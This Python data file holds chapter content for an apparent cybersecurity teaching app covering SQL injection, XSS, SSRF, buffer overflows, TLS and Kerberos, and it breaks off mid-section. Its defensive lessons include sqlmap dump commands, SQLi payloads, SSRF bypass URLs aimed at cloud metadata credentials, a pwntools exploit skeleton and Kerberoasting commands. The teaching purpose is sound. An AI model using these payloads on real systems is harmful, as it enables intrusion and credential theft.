# -*- coding: utf-8 -*-
# Cybersecurity-Mastery - an interactive, offline cybersecurity learning app.
# Copyright (C) 2026 Nithees Narendra S
# SPDX-License-Identifier: GPL-3.0-or-later
#
# This file is part of Cybersecurity-Mastery. It is free software: you can
# redistribute it and/or modify it under the terms of the GNU General Public
# License as published by the Free Software Foundation, either version 3 of the
# License, or (at your option) any later version. There is NO WARRANTY. See the
# LICENSE file for the full text. For use outside the GPL-3.0 terms (e.g.
# proprietary/commercial), contact the copyright holder for a separate licence.

"""Hand-authored, expert-depth content for flagship chapters.

Keyed by chapter slug. The generator (generate.py) overrides its templated
sections with any keys present here, so deep content lives in the data layer and
survives regeneration. Add entries here to deepen more chapters.

Keys (all optional): theory, history, internal, terminology[(term,def)],
extra[(heading, markdown)], realworld, mistakes[..], bestpractices[..], case.
"""

DEEP = {
    # =====================================================================
    "sql-injection": {
        "theory": r"""SQL injection is what happens when a program builds a database query by pasting untrusted
text directly into the query string. The database has no way to know which characters the developer meant
as *code* (keywords, operators, string delimiters) and which arrived from an attacker as *data* — so a
single quote supplied in a form field can end one string literal early and let everything after it be parsed
as SQL. The vulnerability is therefore not a database bug at all; it is a **confusion of code and data** at
the boundary between the application and its data store.

Every SQL injection, from the simplest login bypass to a full database dump, is a variation on that one
idea: the attacker supplies input that changes the *structure* of the query rather than just its values.
The fix follows directly from the diagnosis. If you send the query structure and the user-supplied values to
the database **separately** — a parameterised (prepared) statement — the database parses the structure once,
with the values bound as opaque data that can never be reinterpreted as syntax. Understand injection as a
code/data confusion and both the exploit and the cure become obvious.""",
        "history": r"""SQL injection entered public awareness through Jeff Forristal (writing as "rain.forest.puppy")
in a December 1998 *Phrack* article, and for the next decade it was arguably the most damaging class of web
vulnerability in existence. It sat at #1 on the OWASP Top 10 in 2010 and 2013, and remains folded into the
"Injection" category (A03) in the 2021 list. Landmark breaches — Heartland Payment Systems (2008, ~130M
cards), the 2011 Sony Pictures compromise, TalkTalk (2015) — traced back to injectable queries. Parameterised
APIs and ORMs have reduced its prevalence in greenfield code, but it persists wherever dynamic SQL is
string-built, and it reappears in new guise every time a new query language ships (see NoSQL and GraphQL).""",
        "internal": r"""Consider a login that builds its query like this:

```python
q = "SELECT * FROM users WHERE user = '" + name + "' AND pass = '" + pw + "'"
```

Supply `name = admin'--` and the query the database actually parses becomes:

```sql
SELECT * FROM users WHERE user = 'admin'-- ' AND pass = '...'
```

The `'` closes the username literal early; `--` comments out the rest of the line, including the password
check. Authentication is bypassed because the attacker rewrote the query's structure. The same primitive
scales up: `UNION SELECT` appends attacker-chosen columns from other tables onto the result set; subqueries
against `information_schema` enumerate the schema; stacked queries (where the driver allows them) run entirely
new statements. What crosses the trust boundary is not a value — it is syntax.""",
        "terminology": [
            ("In-band / UNION-based", "Data is exfiltrated through the same channel and response as the injection, e.g. by appending a `UNION SELECT`."),
            ("Error-based", "The DBMS is coerced into putting query results inside its error messages."),
            ("Blind (inferential)", "No data is returned directly; the attacker infers it one bit at a time from boolean responses or timing."),
            ("Out-of-band (OOB)", "Results are exfiltrated over a separate channel the DBMS can trigger, e.g. a DNS lookup."),
            ("Stacked queries", "Multiple statements in one call (`; DROP TABLE ...`), only where the driver permits it."),
            ("Second-order", "Input is stored safely, then later used unsafely in a different query."),
            ("Parameterised / prepared statement", "Query structure is sent to the DBMS separately from bound values — the definitive fix."),
        ],
        "extra": [
            ("Exploitation methodology", r"""A disciplined SQLi assessment follows a fixed order — jumping straight
to a tool wastes the understanding that makes the tool trustworthy.

1. **Find the injectable context.** Add a `'`, a `"`, or a numeric operator and watch for errors, changed
   responses, or timing shifts. Determine whether you are inside a string, a number, an `ORDER BY`, or a
   `LIKE`.
2. **Confirm and shape.** Prove control with a tautology (`' OR '1'='1`) and a false variant (`' AND '1'='2`).
   For UNION, find the column count with `ORDER BY n` until it errors, then find a reflected column type with
   `UNION SELECT NULL, 'x', NULL`.
3. **Enumerate.** Read `information_schema.tables` and `.columns` (or DBMS equivalents) to map the schema.
4. **Extract.** Pull the target data; for blind, script a boolean/time oracle to recover bytes.
5. **Escalate.** Read files, write files, or reach the OS where the DBMS and its privileges allow it
   (`LOAD_FILE`, `INTO OUTFILE`, `xp_cmdshell`, `COPY ... PROGRAM`).

Automate only after you can do each step by hand:

```bash
sqlmap -u 'http://TARGET/item?id=1' --batch --technique=BEU --dbs
sqlmap -u 'http://TARGET/item?id=1' --batch -D shop -T users --dump
```
"""),
            ("Defence in depth", r"""**Primary control — parameterise every query.** This is not "escape the
input"; it is "never build the query out of the input at all":

```python
cur.execute("SELECT * FROM users WHERE user = %s AND pass = %s", (name, pw))
```

Layer additional controls, each of which limits blast radius when the primary control is missed somewhere:

- **Least-privilege DB accounts** — the web app's account should not own `FILE`, `xp_cmdshell`, or DDL.
- **Allow-list where structure is dynamic** — column/table names cannot be parameterised; map user input to a
  fixed set of known-good identifiers.
- **Stored-procedure discipline** — safe only if the procedure itself does not build dynamic SQL from input.
- **WAF** — a speed bump and detection signal, never a fix; assume it can be bypassed.
- **Detection** — log and alert on query errors, `UNION`/`information_schema` in parameters, and unusual
  result volumes.
"""),
        ],
        "realworld": r"""SQL injection is the archetypal example of the code/data confusion that underlies most
injection bugs. Study the 2008 Heartland breach (SQLi foothold that led to card-data theft at enormous scale)
and the 2015 TalkTalk breach (an injectable page that regulators fined the company £400,000 over). In both,
the entire compromise reduces to a single query that was string-built instead of parameterised. Then reproduce
a minimal version against bWAPP or DVWA in the lab so the abstraction becomes muscle memory.""",
        "mistakes": [
            "Escaping quotes by hand instead of parameterising — misses numeric contexts, encodings and edge cases.",
            "Assuming an ORM makes you immune — raw fragments, `.raw()`, and dynamic `ORDER BY` reintroduce injection.",
            "Fixing one endpoint's payload while leaving the class present everywhere else the pattern is used.",
            "Trusting a WAF as the control rather than as a detection layer.",
            "Ignoring second-order injection: input stored safely can still be used unsafely later.",
        ],
        "bestpractices": [
            "Parameterise every query, without exception; treat any string-built SQL as a defect in code review.",
            "Give the application database account the least privilege it can function with.",
            "Allow-list identifiers (table/column/sort) that cannot be bound as parameters.",
            "Add regression tests that fire representative SQLi payloads at every input.",
            "Instrument the database and app for query errors and injection markers, and alert on them.",
        ],
        "case": r"""**TalkTalk (2015).** An unauthenticated SQL injection in a legacy web page exposed the personal
data of ~157,000 customers. The UK ICO fined TalkTalk £400,000, noting the vulnerability was well known and the
fix (parameterised queries) was long-established. Reconstruct the chain in the lab: an injectable parameter →
schema enumeration → data dump, and confirm that a single prepared statement would have closed it entirely.""",
    },

    # =====================================================================
    "xss": {
        "theory": r"""Cross-site scripting is code/data confusion in the browser. A web page is a mix of markup
the developer wrote and data the application inserts; when attacker-controlled data is inserted into the page
without being kept strictly as data, the browser parses part of it as HTML or JavaScript and runs it. Because
that script executes in the victim's session, with the victim's origin and cookies, it can do anything the
victim can do: read the DOM, make authenticated requests, steal tokens, or rewrite the page.

The crucial idea is **output context**. The same input is dangerous or harmless depending on *where* it lands:
inside HTML text, inside an attribute, inside a `<script>` block, inside a URL, or inside a CSS value. Correct
defence is therefore contextual output encoding — encoding the data for the exact place it is written — plus,
increasingly, structural defences (auto-escaping template engines, Content Security Policy, and Trusted Types)
that make the unsafe pattern hard to write in the first place.""",
        "history": r"""The term dates to a late-1990s Microsoft/CERT advisory era; the classic reference is the
2005 Samy worm, which used stored XSS to add over a million MySpace friends in under a day and became the
fastest-spreading worm in history. XSS has appeared on every OWASP Top 10 and is folded into "Injection"
(A03) in 2021. The defensive story has matured from "blacklist `<script>`" (hopeless) to context-aware
encoding, framework auto-escaping (React, Angular), CSP (2012 onward), and Trusted Types (2020 onward), which
attack the DOM sink directly.""",
        "internal": r"""XSS comes in three shapes distinguished by *where the injection lives*:

- **Reflected** — the payload is in the request (a query parameter) and is echoed into the immediate
  response. It requires luring the victim to a crafted URL.
- **Stored (persistent)** — the payload is saved server-side (a comment, profile field) and served to every
  viewer. No lure needed; impact is highest.
- **DOM-based** — the vulnerability is entirely client-side: JavaScript reads a *source* (`location.hash`,
  `document.referrer`) and writes it to a *sink* (`innerHTML`, `eval`, `document.write`) without sanitising.
  The server may never see the payload at all.

In every case the payload succeeds only because it reaches a parsing context that treats it as code. Track the
data from source to sink and identify the context at the sink — that is the whole analysis.""",
        "terminology": [
            ("Source", "A place attacker-controlled data enters the page (URL, form field, postMessage, storage)."),
            ("Sink", "A place data is written such that it can execute (`innerHTML`, `eval`, `setAttribute('href', ...)`)."),
            ("Context", "Where output lands: HTML text, attribute, JS string, URL, or CSS — each needs different encoding."),
            ("Polyglot", "A payload crafted to fire across several contexts at once."),
            ("CSP", "Content Security Policy — a response header that restricts which scripts may run, mitigating XSS impact."),
            ("Trusted Types", "A browser feature that forces DOM sinks to receive vetted, typed values instead of raw strings."),
            ("HttpOnly", "A cookie flag that hides the cookie from JavaScript, blunting cookie theft via XSS."),
        ],
        "extra": [
            ("Context-aware encoding — the core defence", r"""There is no single "XSS escape". Encode for the sink:

| Context | Example sink | Correct handling |
| --- | --- | --- |
| HTML text | `<div>DATA</div>` | HTML-entity encode `< > & "` |
| HTML attribute | `<img alt="DATA">` | Attribute-encode; always quote attributes |
| JavaScript string | `var x = "DATA"` | JS-string encode, or better, serialise as JSON in a data attribute |
| URL | `<a href="DATA">` | URL-encode and validate the scheme (block `javascript:`) |
| CSS | `style="width:DATA"` | Avoid; if unavoidable, strict allow-list |

Prefer framework auto-escaping (React escapes by default; the danger is `dangerouslySetInnerHTML`). For rich
HTML that must be rendered, sanitise with a vetted library (DOMPurify) — never a hand-rolled regex.
"""),
            ("Structural defences: CSP and Trusted Types", r"""Encoding stops the injection; CSP and Trusted Types
limit the damage when encoding is missed somewhere.

A strict, nonce-based CSP neutralises most reflected/stored XSS by refusing to run inline or unlisted scripts:

```
Content-Security-Policy: script-src 'nonce-r4nd0m' 'strict-dynamic'; object-src 'none'; base-uri 'none'
```

Trusted Types attacks DOM XSS at the sink: with `require-trusted-types-for 'script'`, assigning a raw string
to `innerHTML` throws unless it passed through a policy you defined. Combine both with `HttpOnly` +
`Secure` + `SameSite` cookies so that even a successful XSS cannot trivially steal the session.
"""),
        ],
        "realworld": r"""The 2005 Samy worm remains the canonical case: a stored XSS payload in a MySpace profile
that added the author as a friend and copied itself into the victim's profile, propagating exponentially. It
did no lasting damage by design, but demonstrated that stored XSS is self-propagating and that "just a popup"
massively understates the class. Reproduce reflected, stored and DOM variants against Juice Shop in the lab,
then close each with the matching structural defence.""",
        "mistakes": [
            "Blacklisting `<script>` — dozens of other vectors (event handlers, `javascript:` URLs, `<svg onload>`) remain.",
            "Encoding for the wrong context (HTML-encoding a value that lands inside a JS string).",
            "Sanitising on input only — the same value may be rendered in multiple contexts later.",
            "Using a regex to 'clean' HTML instead of a real sanitiser.",
            "Treating DOM XSS as a server problem — the server may never see the payload.",
        ],
        "bestpractices": [
            "Encode output for its exact context; lean on a template engine that auto-escapes by default.",
            "Deploy a strict, nonce-based CSP and add Trusted Types for DOM sinks.",
            "Set HttpOnly, Secure and SameSite on session cookies to blunt token theft.",
            "Sanitise rich HTML with a maintained library (DOMPurify), never bespoke filtering.",
            "Add automated tests that inject context-specific payloads at every sink.",
        ],
        "case": r"""**British Airways (2018).** A Magecart group injected ~22 lines of malicious JavaScript into
BA's payment page (a client-side script-integrity failure closely related to XSS), skimming ~380,000 card
details. The lesson for the XSS family: client-side code and third-party scripts are part of your attack
surface, and CSP + Subresource Integrity are load-bearing controls, not nice-to-haves.""",
    },

    # =====================================================================
    "ssrf": {
        "theory": r"""Server-Side Request Forgery abuses a server's willingness to make outbound requests to
URLs it derives from user input. The application is a trusted client sitting inside a trusted network; if an
attacker can choose where it connects, they borrow that position to reach things they cannot reach directly —
internal services, cloud metadata endpoints, admin interfaces bound to localhost, or other tenants. The
server becomes a confused deputy.

SSRF matters far more in cloud environments than the name suggests, because cloud instances expose a metadata
service at a fixed link-local address (`169.254.169.254`) that hands out temporary credentials to anything on
the instance that asks. An SSRF that can reach that endpoint frequently converts into full cloud account
compromise. The defence is not "validate the URL string" — URL parsers disagree in exploitable ways — but
"control where the server is allowed to connect", enforced after DNS resolution.""",
        "history": r"""SSRF was recognised as a distinct class in the early 2010s and earned its own OWASP Top 10
slot (A10) in 2021, driven overwhelmingly by cloud. The defining incident is the 2019 Capital One breach: an
SSRF against a web application firewall reached the AWS instance metadata service, retrieved IAM role
credentials, and used them to read ~100 million customer records from S3. It reshaped cloud guidance and
accelerated adoption of IMDSv2, which requires a session token and thereby breaks the simplest SSRF-to-metadata
chain.""",
        "internal": r"""A vulnerable endpoint typically looks benign: "fetch this URL and show me the result" —
a link preview, a webhook tester, a PDF renderer, an image proxy. The flaw is that the destination is
attacker-controlled. Exploitation explores where the server can be pointed:

- **Cloud metadata** — `http://169.254.169.254/latest/meta-data/iam/security-credentials/` on AWS (pre-IMDSv2),
  or the GCP/Azure equivalents, to steal credentials.
- **Internal services** — `http://10.0.0.5:6379/` or `http://localhost:8080/admin` that have no external route.
- **Blind SSRF** — no response is returned, but a callback (DNS/HTTP to attacker infrastructure) confirms the
  request fired, and can still be weaponised.
- **Filter bypass** — parser confusion (`http://127.0.0.1@evil`), alternate encodings, redirects, DNS
  rebinding (a name that resolves to a safe IP on validation and a target IP on use).

The bytes crossing the boundary are a *destination*, and the server's network position is the asset.""",
        "terminology": [
            ("Metadata service (IMDS)", "A cloud endpoint at 169.254.169.254 serving instance data and temporary credentials."),
            ("IMDSv2", "Session-token-protected metadata access that defeats naive SSRF-to-metadata."),
            ("Blind SSRF", "SSRF where the response is not returned; confirmed via an out-of-band callback."),
            ("DNS rebinding", "Bypassing validation by resolving a hostname to a safe IP at check time and a target IP at use time."),
            ("SSRF-to-RCE", "Chaining SSRF into code execution via internal services (Redis, unauthenticated admin APIs)."),
            ("Egress filtering", "Network controls restricting which destinations a server may connect to."),
        ],
        "extra": [
            ("Why URL validation fails, and what to do instead", r"""Attackers exploit the gap between the parser
that *validates* the URL and the client that *fetches* it. Classic bypasses:

```
http://127.0.0.1            http://0177.0.0.1 (octal)     http://2130706433 (decimal)
http://[::1]                http://127.0.0.1.nip.io       http://evil.com#@169.254.169.254/
http://localhost@target/    http://target%2f@safe/        302 redirect to an internal URL
```

Robust defence stops trying to bless the string and instead controls the connection:

1. **Resolve the hostname yourself**, then **validate the resulting IP** against a deny-list of private,
   loopback, link-local and cloud-metadata ranges — and re-validate after any redirect.
2. **Pin the connection to the validated IP** so DNS rebinding cannot swap it between check and use.
3. **Disable redirects** or re-run validation on each hop.
4. **Enforce egress filtering** at the network so a compromised fetcher simply cannot route to sensitive ranges.
5. **Require IMDSv2** and set the metadata hop limit to 1 so a proxied request cannot reach it.
"""),
        ],
        "realworld": r"""Capital One (2019) is the case every practitioner should be able to narrate end to end:
misconfigured WAF → SSRF → instance metadata → IAM credentials → S3 exfiltration of ~100M records. It is the
clearest demonstration that SSRF in the cloud is not "internal port scanning" but a credential-theft primitive.
Rebuild a miniature of it in the lab with a mock metadata service on an isolated network.""",
        "mistakes": [
            "Validating the URL string instead of the resolved IP and the actual connection.",
            "Validating before a redirect but not after — the redirect target is never checked.",
            "Allowing the fetcher to reach the metadata service (no IMDSv2, no hop-limit, no egress filter).",
            "Treating blind SSRF as low-risk because 'nothing comes back'.",
            "Relying on a single allow/deny list without pinning DNS, leaving rebinding open.",
        ],
        "bestpractices": [
            "Resolve, validate the IP against private/link-local/metadata ranges, and pin the connection to it.",
            "Disable or re-validate redirects; treat each hop as a fresh request.",
            "Enforce network egress filtering so sensitive ranges are unreachable regardless of app bugs.",
            "Require IMDSv2 and set the metadata hop limit to 1 on cloud instances.",
            "Prefer allow-lists of exact destinations for server-side fetchers where the use case permits.",
        ],
        "case": r"""**Capital One (2019).** SSRF against a misconfigured ModSecurity WAF reached the EC2 metadata
service and retrieved the credentials of an over-privileged IAM role, which could list and read ~700 S3 buckets.
~100M US and ~6M Canadian records were exposed. Root causes worth extracting: SSRF reachability to IMDS, an
over-permissioned role, and no egress control — three independent failures, each of which alone would have
broken the chain.""",
    },

    # =====================================================================
    "buffer-overflow": {
        "theory": r"""A buffer overflow occurs when a program writes more data into a fixed-size memory region
than it can hold, corrupting whatever lies adjacent. In languages without automatic bounds checking — chiefly
C and C++ — the adjacent memory can be other variables, heap metadata, or, most usefully to an attacker, saved
control data such as a function's return address. By overwriting that control data with a chosen value, an
attacker redirects the program's execution.

The overflow itself is only the *primitive*. Turning it into reliable code execution is a second discipline
of defeating the mitigations layered on modern systems: stack canaries, non-executable memory (NX/DEP),
address space layout randomisation (ASLR), and control-flow integrity. Studying overflows teaches you how a
CPU actually runs code — the stack, calling conventions, and memory layout — which is why it remains a
cornerstone of exploitation and reverse-engineering education.""",
        "history": r"""The 1988 Morris Worm exploited a stack overflow in the Unix `fingerd` daemon and is the
first internet-scale incident. The technique was systematised for a generation by Aleph One's 1996 *Phrack*
article "Smashing the Stack for Fun and Profit". The 2000s were an arms race: canaries (StackGuard) →
attackers adapt; NX/DEP → return-to-libc; ASLR → information leaks and ROP (Shacham, 2007). Code Red and
SQL Slammer (2001–2003) were worms built on overflows. Memory-safe languages (Rust, Go) and hardware
mitigations (Intel CET, ARM PAC/MTE) are the current front, but C/C++ codebases keep the class alive; roughly
70% of the severe CVEs at Microsoft and Google are memory-safety issues.""",
        "internal": r"""When a function is called on x86-64, the return address is pushed to the stack; the
function then allocates local buffers below it. A `char buf[64]` sits at a lower address than the saved return
address, and a copy loop that does not check length writes *upward* toward it:

```
higher addresses
   [ saved return address ]  <- overwrite this to hijack control
   [ saved base pointer    ]
   [ char buf[64]          ]  <- write starts here, grows up
lower addresses
```

Overflow `buf` by enough bytes and you reach the saved return address. Replace it with the address of code you
control and, when the function returns, execution jumps there. The classic exploit places shellcode in the
buffer and points the return address at it; on modern systems, where the stack is non-executable, the return
address instead points at a chain of existing code fragments (ROP) that call `mprotect` or `system`.""",
        "terminology": [
            ("Return address", "The saved location a function returns to — the prime overwrite target on the stack."),
            ("Stack canary", "A random value placed before the return address and checked on return to detect overflow."),
            ("NX / DEP", "Marks memory non-executable so injected shellcode on the stack cannot run."),
            ("ASLR", "Randomises memory layout so attackers cannot predict addresses without a leak."),
            ("ROP (Return-Oriented Programming)", "Chaining existing code 'gadgets' ending in `ret` to compute despite NX."),
            ("ret2libc", "Redirecting execution to an existing libc function (e.g. `system`) instead of injected code."),
            ("Shellcode", "Position-independent machine code, historically to spawn a shell, placed by the exploit."),
        ],
        "extra": [
            ("From crash to control — the modern pipeline", r"""Exploit development is methodical:

1. **Fuzz / trigger** a crash and capture the state (a controlled `RIP` is the goal).
2. **Find the offset** to the return address with a cyclic pattern:
   ```bash
   pwn cyclic 200            # send as input
   pwn cyclic -l 0x6161616c  # look up the crashing value -> exact offset
   ```
3. **Assess mitigations**: `checksec ./vuln` reports canary, NX, PIE, RELRO.
4. **Build the primitive** appropriate to the mitigations:
   - No canary, no NX → inject shellcode, jump to it.
   - NX on → ROP chain to `mprotect`/`system` (ret2libc).
   - PIE/ASLR on → first leak an address to defeat randomisation, then ROP.
5. **Stabilise** the exploit for reliability.

A minimal pwntools skeleton:

```python
from pwn import *
elf = context.binary = ELF('./vuln')
p = process()
offset = 72
rop = ROP(elf)
rop.call(elf.symbols['win'])            # ret2win in the mitigations-off lab
p.sendline(b'A'*offset + rop.chain())
p.interactive()
```
"""),
            ("Why the mitigations matter", r"""Each mitigation removes one assumption the classic exploit relied on:

- **Canary** breaks 'overwrite the return address undetected' — you must leak or avoid it.
- **NX** breaks 'run shellcode on the stack' — forces code reuse (ROP/ret2libc).
- **ASLR/PIE** breaks 'I know where things are' — forces an information leak first.
- **CET / shadow stack** breaks ROP's return-address rewriting — the frontier.

Rebuild the same exploit as you enable each one in the lab; feeling the exploit break and re-developing it is
how the theory becomes intuition.
"""),
        ],
        "realworld": r"""The 1988 Morris Worm (fingerd stack overflow) and the 2003 SQL Slammer (a 376-byte UDP
packet overflowing a buffer in SQL Server, which doubled its infected population every ~8.5 seconds) bookend
why this class defined internet security for decades. For a modern lens, read any recent memory-safety CVE
advisory from a browser or kernel and note how much of the write-up is about defeating mitigations rather than
the overflow itself.""",
        "mistakes": [
            "Testing exploits with mitigations off and assuming they work in the real, hardened target.",
            "Confusing the overflow (the bug) with the exploit (defeating canary/NX/ASLR to weaponise it).",
            "Using `strcpy`/`gets`/`sprintf` in new C code instead of bounded, length-checked APIs.",
            "Ignoring integer overflows that produce undersized allocations feeding the buffer bug.",
            "Assuming ASLR alone is protection without an accompanying leak-resistance analysis.",
        ],
        "bestpractices": [
            "Prefer memory-safe languages (Rust, Go) for new code handling untrusted input.",
            "In C/C++, use bounded APIs, compile with all mitigations, and run ASAN/UBSan in CI.",
            "Fuzz parsers continuously; most memory-corruption bugs are found fastest by coverage-guided fuzzing.",
            "Enable and verify canary, NX, full RELRO, PIE and CET where the toolchain supports them.",
            "Treat any out-of-bounds write as critical regardless of whether you can immediately exploit it.",
        ],
        "case": r"""**SQL Slammer (January 2003).** A single 376-byte UDP packet exploited a stack buffer overflow
in Microsoft SQL Server's resolution service, needing no disk write and spreading purely in memory. It
infected most vulnerable hosts on the internet within ten minutes and disrupted ATMs and airline systems.
Extract the lesson: an unauthenticated overflow in a network-facing service is among the most dangerous bugs
that exist, and a patch had been available for six months.""",
    },

    # =====================================================================
    "tls": {
        "theory": r"""TLS (Transport Layer Security) provides a secure channel over an insecure network with three
guarantees: **confidentiality** (eavesdroppers learn nothing), **integrity** (tampering is detected), and
**authentication** (you are talking to who you think, via certificates). It is the protocol behind the "s" in
HTTPS and secures email, VPNs, APIs and databases besides. Crucially, TLS composes primitives you study
elsewhere — key exchange, symmetric encryption, MACs, signatures, certificates — into one handshake, so it is
where cryptographic theory meets operational reality.

The security of TLS rests on the handshake correctly negotiating strong parameters and validating the server's
certificate chain. Historically, most TLS failures were not breaks of the underlying maths but failures at the
edges: downgrade to weak options, certificate-validation bugs, padding oracles, and implementation flaws like
Heartbleed. TLS 1.3 (2018) was a deliberate simplification that removed the dangerous options and made the
protocol faster and safer by construction.""",
        "history": r"""SSL was created at Netscape (SSL 2.0 in 1995, 3.0 in 1996). The IETF took over and renamed
it TLS: 1.0 (1999), 1.1 (2006), 1.2 (2008), and the ground-up redesign 1.3 (RFC 8446, 2018). The 2010s were a
parade of named attacks — BEAST, CRIME, Lucky 13, POODLE (killed SSL 3.0), Heartbleed (2014, a memory
-disclosure bug in OpenSSL, not TLS itself), FREAK and Logjam (downgrade to export-grade crypto) — each of
which pruned weak options. TLS 1.3 removed static RSA key exchange, CBC MAC-then-encrypt, renegotiation and
compression, mandated forward secrecy, and cut the handshake to one round trip (0-RTT for resumption).""",
        "internal": r"""A TLS 1.3 handshake is lean. The client sends `ClientHello` with its supported cipher
suites and, optimistically, a Diffie-Hellman key share. The server replies `ServerHello` with its chosen suite
and key share, and — now encrypted — its certificate, a signature over the handshake transcript (proving it
holds the certificate's private key), and a `Finished` MAC. Both sides derive the same session keys from the
DH shared secret via the HKDF key schedule. From that point, application data is protected with an AEAD cipher
(AES-GCM or ChaCha20-Poly1305) that provides confidentiality and integrity together.

The trust hinges on the certificate: the client must build a chain from the server's certificate to a trusted
root CA, check the name matches, verify validity dates, and check revocation. Every historic "TLS bug" is
either a weakness in the negotiated parameters or a failure somewhere in that validation.""",
        "terminology": [
            ("Handshake", "The negotiation that authenticates the peer and establishes session keys."),
            ("Cipher suite", "The named bundle of algorithms (key exchange, authentication, AEAD) TLS agrees on."),
            ("Forward secrecy (PFS)", "Ephemeral keys ensure past traffic stays safe even if the long-term key later leaks."),
            ("AEAD", "Authenticated Encryption with Associated Data — encryption and integrity in one primitive (GCM, ChaCha20-Poly1305)."),
            ("Certificate chain", "The path from the server's cert to a trusted root CA that establishes authenticity."),
            ("SNI", "Server Name Indication — the hostname the client requests, historically sent in the clear."),
            ("0-RTT", "TLS 1.3 resumption mode that sends data on the first flight, at the cost of replay risk."),
        ],
        "extra": [
            ("Inspecting and hardening TLS", r"""Read a real handshake and grade a deployment:

```bash
# See the negotiated version, suite, and certificate chain
openssl s_client -connect example.com:443 -servername example.com </dev/null 2>/dev/null \
  | openssl x509 -noout -subject -issuer -dates

# Enumerate what a server supports (lab/owned hosts only)
nmap --script ssl-enum-ciphers -p 443 TARGET
```

Hardening checklist: TLS 1.2+ only (prefer 1.3), forward-secret suites only (ECDHE), AEAD ciphers only,
OCSP stapling, HSTS, a correctly ordered chain, and modern key sizes (RSA ≥ 2048 or ECDSA P-256). Test with
`testssl.sh` or SSL Labs' methodology.
"""),
        ],
        "realworld": r"""Heartbleed (CVE-2014-0160) is the essential case: a missing bounds check in OpenSSL's
TLS heartbeat let an attacker read up to 64 KB of server memory per request — including private keys, session
cookies and passwords — with no trace. It affected an estimated two-thirds of web servers and prompted the
Core Infrastructure Initiative to fund critical open-source libraries. Note that it was an *implementation*
flaw, not a weakness in the TLS design — a distinction worth internalising.""",
        "mistakes": [
            "Allowing legacy protocol versions (SSL 3.0, TLS 1.0/1.1) or non-forward-secret cipher suites.",
            "Disabling or mishandling certificate validation in clients 'to make it work'.",
            "Trusting SNI/hostname checks to something other than the TLS stack's validated identity.",
            "Enabling 0-RTT for non-idempotent requests without replay protection.",
            "Forgetting revocation/expiry monitoring, leading to outages or trust in revoked certs.",
        ],
        "bestpractices": [
            "Prefer TLS 1.3; where 1.2 is required, restrict to ECDHE + AEAD suites.",
            "Automate certificate issuance and renewal (ACME) and monitor expiry and CT logs.",
            "Enable HSTS and OCSP stapling; keep the chain correctly ordered and complete.",
            "Never disable certificate validation; pin or constrain trust where the threat model warrants.",
            "Keep TLS libraries patched — most real TLS incidents are implementation bugs.",
        ],
        "case": r"""**Heartbleed (2014).** A one-line missing length check in OpenSSL's `dtls1_process_heartbeat`
allowed remote memory disclosure. Its impact — silent theft of private keys from ~500,000 trusted certificates
— forced mass certificate reissuance and reshaped how the industry funds critical infrastructure code.
Reproduce the concept (not against public systems) with a vulnerable OpenSSL build in an isolated lab to see
exactly what leaks.""",
    },

    # =====================================================================
    "kerberos": {
        "theory": r"""Kerberos is a ticket-based authentication protocol that lets a client prove its identity to
services across a network without ever sending a password over the wire, using a trusted third party — the Key
Distribution Center (KDC) — and symmetric cryptography. In Windows Active Directory it is the primary
authentication protocol, which makes it central to both defending and attacking enterprise networks. Its
elegance is that a user authenticates once and receives a Ticket-Granting Ticket (TGT), then trades that TGT
for per-service tickets without re-entering credentials.

That same design creates a rich attack surface. Because tickets are encrypted with keys derived from account
passwords, an attacker who obtains a ticket can crack it offline (Kerberoasting); because the KDC trusts what
is inside a validly-encrypted ticket, an attacker who compromises the right key can forge tickets (Golden/
Silver); and because delegation lets services act on a user's behalf, misconfigured delegation becomes a
privilege-escalation path. Understanding Kerberos is the difference between memorising AD attacks and
reasoning about them.""",
        "history": r"""Kerberos was developed at MIT's Project Athena in the 1980s; version 5 (RFC 1510, 1993;
updated by RFC 4120 in 2005) is the modern standard, named for the three-headed dog guarding Hades — a nod to
its three parties. Microsoft adopted it as Active Directory's default authentication in Windows 2000,
extending it with the Privilege Attribute Certificate (PAC) that carries authorisation data (group
memberships). The offensive research that defines today's AD tradecraft — Kerberoasting (Tim Medin, 2014),
Golden Tickets (Benjamin Delpy / Mimikatz), and delegation abuses — all target these mechanics.""",
        "internal": r"""Kerberos runs in three exchanges:

1. **AS (Authentication Service).** The client sends an `AS-REQ` timestamp encrypted with a key derived from
   its password. The KDC verifies it and returns an `AS-REP` containing a **TGT** (encrypted with the KDC's
   `krbtgt` key) and a session key.
2. **TGS (Ticket-Granting Service).** To use a service, the client presents its TGT and asks for a service
   ticket (`TGS-REQ`). The KDC returns a **service ticket** encrypted with the *target service account's* key.
3. **AP (Application).** The client presents the service ticket to the service, which decrypts it with its own
   key and reads the identity and authorisation (PAC) inside.

The trust boundaries that attackers target: the service ticket is encrypted with the service account's
password-derived key (crackable offline — Kerberoasting); the TGT is encrypted with `krbtgt` (compromise it and
forge any TGT — Golden Ticket); a service ticket forged with a service key grants access to that one service
(Silver Ticket).""",
        "terminology": [
            ("KDC", "Key Distribution Center — the trusted third party issuing tickets; in AD, every domain controller."),
            ("TGT", "Ticket-Granting Ticket — proof of authentication, encrypted with the krbtgt key."),
            ("Service ticket (TGS)", "A ticket for one service, encrypted with that service account's key."),
            ("krbtgt", "The account whose key encrypts all TGTs; its hash is the master key of the domain."),
            ("PAC", "Privilege Attribute Certificate — authorisation data (groups/SIDs) carried inside a ticket."),
            ("SPN", "Service Principal Name — the identifier a service ticket is requested for; the hook for Kerberoasting."),
            ("Delegation", "A service's ability to act on a user's behalf (unconstrained/constrained/RBCD) — a common escalation path."),
        ],
        "extra": [
            ("The ticket-attack family", r"""Each attack maps directly to a boundary above:

- **Kerberoasting (T1558.003).** Request service tickets for accounts with SPNs; the ticket is encrypted with
  the service account's password key, so crack it offline. Service accounts often have weak, non-expiring
  passwords.
  ```bash
  impacket-GetUserSPNs -request -dc-ip DC_IP domain/user
  hashcat -m 13100 spns.hash rockyou.txt
  ```
- **AS-REP Roasting (T1558.004).** For accounts with pre-authentication disabled, request an AS-REP and crack
  it offline — no credentials needed.
- **Golden Ticket (T1558.001).** With the `krbtgt` hash, forge an arbitrary TGT — full domain persistence.
- **Silver Ticket (T1558.002).** With a service account's key, forge a service ticket for that one service,
  bypassing the KDC entirely.
- **Delegation abuse (T1550/T1484).** Unconstrained delegation captures TGTs; constrained and resource-based
  constrained delegation (RBCD) can be abused to impersonate privileged users.
"""),
            ("Detecting Kerberos abuse", r"""Attack and detection are two views of one event:

- **Kerberoasting** — Event ID **4769** (service ticket requested), especially with RC4 (`0x17`) encryption
  and a spike of SPN requests from one principal.
